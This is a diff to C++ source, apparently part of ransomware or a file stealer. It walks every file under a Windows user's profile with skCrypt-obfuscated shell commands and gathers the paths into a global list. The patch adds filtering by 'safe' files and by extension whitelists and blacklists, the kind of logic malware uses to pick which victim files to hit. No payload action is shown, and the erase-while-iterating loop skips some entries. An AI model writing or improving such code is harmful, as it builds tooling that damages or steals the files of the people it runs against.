@@ -67,11 +67,27 @@ void getAllFiles(string username) {
     for (string file : split(exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
         tmpFiles.push_back(file);
 
-    for (int i = 0; i < tmpFiles.size(); i++)
+    for (int i = 0; i < tmpFiles.size(); i++) {
+        vector<string> fileSplitted = split(tmpFiles[i], '.');
+
         for (string safeFile : safeFiles)
             if (safeFile == tmpFiles[i])
-                tmpFiles.erase(tmpFiles.begin() + i);
+                goto erase;
 
+        if (ENABLE_WHITELIST)
+            for (string extensionW : whitelist)
+                if (fileSplitted.back() == extensionW)
+                    goto continue_;
+        if (ENABLE_BLACKLIST)
+            for (string extensionB : blacklist)
+                if (fileSplitted.back() == extensionB)
+                    goto erase;
+
+    continue_:
+        continue;
+    erase:
+        tmpFiles.erase(tmpFiles.begin() + i);
+    }
 
     allFilesMutex.lock();
     globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
@@ -113,8 +129,27 @@ vector<string> getFiles(string mainDir) {
 
     if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
         vector<string> files = split(exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
-        for (string file : files)
+        for (string file : files) {
+            vector<string> fileSplitted = split(file, '.');
+
+            for (string safeFile : safeFiles)
+                if (safeFile == file)
+                    goto continue_;
+
+            if (ENABLE_WHITELIST)
+                for (string extensionW : whitelist)
+                    if (fileSplitted.back() == extensionW)
+                        goto push;
+            if (ENABLE_BLACKLIST)
+                for (string extensionB : blacklist)
+                    if (fileSplitted.back() == extensionB)
+                        goto continue_;
+
+        push:
             result.push_back(file);
+        continue_:
+            continue;
+        }
     }
 
     else {
